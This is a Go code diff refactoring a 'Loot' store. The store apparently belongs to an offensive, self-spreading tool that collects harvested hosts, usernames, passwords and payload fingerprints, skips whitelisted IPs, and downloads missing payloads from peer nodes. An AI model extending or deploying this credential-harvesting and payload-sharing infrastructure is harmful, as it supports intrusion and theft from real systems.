@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/json"
+	"fmt"
 	"strings"
 	"sync"
 
@@ -68,72 +69,78 @@ func (l *Loot) HasPayload(fingerprint string) bool {
 	return l.payloads.Has(fingerprint)
 }
 
-func (l *Loot) AddUser(user string) {
+func (l *Loot) AddUser(user string) bool {
 	user = strings.TrimSpace(user)
 	if user == "" {
-		return
+		return false
 	}
 
 	if l.HasUser(user) {
-		return
+		return false
 	}
 	l.lock.Lock()
 	defer l.lock.Unlock()
 	l.users[user] = true
+	return true
 }
 
-func (l *Loot) AddPassword(password string) {
+func (l *Loot) AddPassword(password string) bool {
 	password = strings.TrimSpace(password)
 	if password == "" {
-		return
+		return false
 	}
 
 	if l.HasPassword(password) {
-		return
+		return false
 	}
 	l.lock.Lock()
 	defer l.lock.Unlock()
 	l.passwords[password] = true
+	return true
 }
 
-func (l *Loot) AddHost(host string) {
+func (l *Loot) AddHost(host string) bool {
 	host = strings.TrimSpace(host)
 	if host == "" {
-		return
+		return false
 	}
 
 	if isIPWhitelisted(host) {
-		return // we never add whitelisted hosts
+		return false // we never add whitelisted hosts
 	}
 	if l.HasHost(host) {
-		return
+		return false
 	}
 	l.lock.Lock()
 	defer l.lock.Unlock()
 	l.hosts[host] = true
+	return true
 }
 
-func (l *Loot) AddFingerprint(fingerprint string) {
+func (l *Loot) AddFingerprint(fingerprint string) bool {
 	fingerprint = strings.TrimSpace(fingerprint)
 	if fingerprint == "" {
-		return
+		return false
 	}
 
-	if l.HasFingerprint(fingerprint) {
-		return
+	if !l.HasFingerprint(fingerprint) {
+		l.lock.Lock()
+		defer l.lock.Unlock()
+		l.fingerprints[fingerprint] = true
 	}
-	l.lock.Lock()
-	defer l.lock.Unlock()
-	l.fingerprints[fingerprint] = true
 
-	l.AddPayload(fingerprint)
+	if !l.HasPayload(fingerprint) {
+		l.AddPayload(fingerprint)
+	}
+	return true
 }
 
 func (l *Loot) AddPayload(fingerprint string) {
 	p := NewPayload()
-	p.hash = fingerprint
+	p.SetHash(fingerprint)
 	if !p.Exists() {
 		if !p.Download(fingerprint) { // try to download from known nodes
+			// LogErrorLn("Payload %s was not found anywhere", colorFile(p.file))
 			return
 		}
 	}
@@ -190,10 +197,10 @@ func (l *Loot) GetFingerprints() []string {
 
 func (l *Loot) JSON() string {
 	data := LootJSON{
-		Hosts:        maps.Keys(l.hosts),
-		Users:        maps.Keys(l.users),
-		Passwords:    maps.Keys(l.passwords),
-		Fingerprints: maps.Keys(l.fingerprints),
+		Hosts:        l.GetHosts(),
+		Users:        l.GetUsers(),
+		Passwords:    l.GetPasswords(),
+		Fingerprints: l.GetFingerprints(),
 	}
 	json, err := json.Marshal(data)
 	if err != nil {
@@ -205,7 +212,29 @@ func (l *Loot) JSON() string {
 }
 
 func (l *Loot) Fingerprint() string {
-	return StringToSha256(l.JSON())
+	return fmt.Sprintf(
+		"%s:%s:%s:%s",
+		l.FingerprintHosts(),
+		l.FingerprintUsers(),
+		l.FingerprintPasswords(),
+		l.FingerprintFingerprints(),
+	)
+}
+
+func (l *Loot) FingerprintHosts() string {
+	return StringSliceToSha256(l.GetHosts())
+}
+
+func (l *Loot) FingerprintUsers() string {
+	return StringSliceToSha256(l.GetUsers())
+}
+
+func (l *Loot) FingerprintPasswords() string {
+	return StringSliceToSha256(l.GetPasswords())
+}
+
+func (l *Loot) FingerprintFingerprints() string {
+	return StringSliceToSha256(l.GetFingerprints())
 }
 
 func NewLoot() *Loot {
